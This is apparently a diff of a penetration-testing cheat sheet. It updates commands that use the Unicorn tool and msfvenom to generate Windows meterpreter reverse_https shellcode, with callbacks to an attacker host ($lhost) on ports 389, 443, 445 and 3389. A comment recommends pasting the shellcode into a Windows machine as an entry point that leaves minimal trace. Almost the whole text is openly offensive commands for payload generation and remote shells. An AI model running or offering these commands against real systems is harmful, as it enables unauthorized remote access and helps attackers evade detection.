@@ -16,10 +16,10 @@ msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/met
 
 # Unicorn Payloads (No exe's! Just paste in the shellcode and bam you have a reverse shell! Great entry points on the system since it leaves minimal trace 
 # (python unicorn.py <meterpreter> <LHOST> <PORT>) then (cat powershell_attack.txt) to copy the shellcode and paste it into the windows box. Once you are in your meterpreter session, be sure to run load stdapi or nothing will work
-python unicorn.py windows/meterpreter/reverse_https $lhost 389
+python3 unicorn.py windows/meterpreter/reverse_https $lhost 389
 
-python unicorn.py windows/meterpreter/reverse_https $lhost 443
+python3 unicorn.py windows/meterpreter/reverse_https $lhost 443
 
-python unicorn.py windows/meterpreter/reverse_https $lhost 445
+python3 unicorn.py windows/meterpreter/reverse_https $lhost 445
 
-python unicorn.py windows/meterpreter/reverse_https $lhost 3389
+python3 unicorn.py windows/meterpreter/reverse_https $lhost 3389
